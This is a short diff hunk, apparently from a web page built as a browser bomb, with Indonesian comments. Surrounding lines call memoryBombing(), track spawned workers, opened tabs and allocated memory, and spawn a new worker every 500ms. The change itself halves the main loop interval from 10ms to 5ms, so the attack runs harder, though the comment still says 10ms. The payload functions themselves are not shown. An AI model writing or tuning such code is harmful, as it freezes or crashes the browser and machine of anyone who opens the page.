@@ -127,7 +127,7 @@
             memoryBombing();
             
             statusDiv.textContent = `Workers: ${totalWorkers} | Tabs: ${totalTabs} | Memory: ${memoryBomb.length * 10}MB`;
-        }, 10); // Setiap 10ms
+        }, 5); // Setiap 10ms
 
         // Worker Creator Loop (Spawn worker baru setiap 500ms)
         setInterval(spawnWorker, 500);
